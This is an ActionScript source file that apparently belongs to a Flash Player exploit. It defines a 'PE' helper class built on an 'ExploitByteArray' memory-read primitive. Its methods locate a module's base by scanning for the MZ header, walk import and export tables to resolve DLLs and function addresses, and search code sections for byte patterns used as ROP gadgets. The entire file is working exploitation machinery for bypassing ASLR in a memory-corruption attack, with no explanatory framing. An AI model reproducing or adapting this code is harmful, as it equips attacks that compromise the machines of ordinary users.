package
{
    public class PE
    {
        private var eba:ExploitByteArray

        public function PE(ba:ExploitByteArray)
        {
            eba = ba
        }

        public function base(addr:uint):uint
        {
            addr &= 0xffff0000
            while (true) {
                if (eba.read(addr) == 0x00905a4d) return addr
                addr -= 0x10000
            }
            return 0
        }

        public function module(name:String, addr:uint):uint
        {
            var iat:uint = addr + eba.read(addr + eba.read(addr + 0x3c) + 0x80), i:int = -1
            var mod_name:String

            while (true) {
                var entry:uint = eba.read(iat + (++i) * 0x14 + 12)
                if (!entry) throw new Error("FAIL!"); 
                mod_name = eba.read_string(addr + entry, name.length)
                if (mod_name.toUpperCase() == name.toUpperCase()) break
            }
            return base(eba.read(addr + eba.read(iat + i * 0x14 + 16)))
        }

        public function procedure(name:String, addr:uint):uint
        {
            var eat:uint = addr + eba.read(addr + eba.read(addr + 0x3c) + 0x78)
            var numberOfNames:uint = eba.read(eat + 0x18)
            var addressOfFunctions:uint = addr + eba.read(eat + 0x1c)
            var addressOfNames:uint = addr + eba.read(eat + 0x20)
            var addressOfNameOrdinals:uint = addr + eba.read(eat + 0x24)
            var proc_name:String

            for (var i:uint = 0; ; i++) {
                var entry:uint = eba.read(addressOfNames + i * 4)
                proc_name = eba.read_string(addr + entry, name.length + 2)
                if (proc_name.toUpperCase() == name.toUpperCase()) break
            }
            return addr + eba.read(addressOfFunctions + eba.read(addressOfNameOrdinals + i * 2, "word") * 4)
        }

        public function gadget(gadget:String, hint:uint, addr:uint):uint
        {
            var find:uint = 0
            var contents:uint = 0
            var baseOfCode:uint = addr + eba.read(addr + eba.read(addr + 0x3c) + 0x2c)
            var sizeOfCode:uint = eba.read(addr + eba.read(addr + 0x3c) + 0x1c)
            var value:uint = parseInt(gadget, 16)

            for (var i:uint = 0; i < sizeOfCode - 3; i++) {
                contents = eba.read(baseOfCode + i)
                if (hint == 0xffffffff && value == contents) {
                    return baseOfCode + i
                }
                if (hint != 0xffffffff && value == (contents & hint)) {
                    return baseOfCode + i
                }
            }
            throw new Error()
        }
    }
}